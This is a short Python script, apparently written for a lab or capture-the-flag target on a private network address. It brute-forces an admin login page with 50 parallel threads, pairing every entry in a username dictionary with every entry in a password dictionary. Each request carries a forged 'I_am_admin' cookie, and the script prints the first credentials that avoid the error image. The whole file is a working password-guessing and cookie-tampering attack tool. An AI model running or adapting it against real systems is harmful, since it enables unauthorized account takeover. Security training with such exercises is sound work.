from threading import Thread
import requests
import os


URL ='http://192.168.210.129/admin/index.php'
COOKIES = {'I_am_admin': '68934a3e9455fa72420237eb05902327'}
LOGINS = 'dic_pseudo2.txt'
PASSWORDS = 'dic_mdp.txt'


def read_dicts():
	with open(LOGINS) as f:
		list_logins = f.read().split('\n')[:-1]
	with open(PASSWORDS) as f:
		list_passwords = f.read().split('\n')[:-1]
	return list_logins, list_passwords


def get_dict_combination(slices, list_logins, list_passwords):
    turn = 0
    combinations = [list() for x in range(slices)]

    for login in list_logins:
        for password in list_passwords:
            combinations[turn].append({'username': login, 'password': password, 'Login': 'Login'})
            turn = (turn + 1) % slices
    return combinations


def threaded_function(id, combinations):
    combinations_len = len(combinations)
    for index, combination in enumerate(combinations):
        print("Thread {}: try {} on {}".format(id, index, combinations_len))
        r = requests.post(URL, data=combination, cookies=COOKIES).text
        if 'images/WrongAnswer.gif' not in r:
          print("Login: {}".format(combination['username']))
          print("Password: {}".format(combination['password']))
          os._exit(0)


if __name__ == "__main__":
    list_logins, list_passwords = read_dicts()
    grouped_combinations = get_dict_combination(50, list_logins, list_passwords)

    thread_list = []
    for i, combinations in enumerate(grouped_combinations):
        thread_list.append(Thread(target = threaded_function, args = ([i, combinations])))
    [thread.start() for thread in thread_list]
    [thread.join() for thread in thread_list]

    print("Nothing found :(")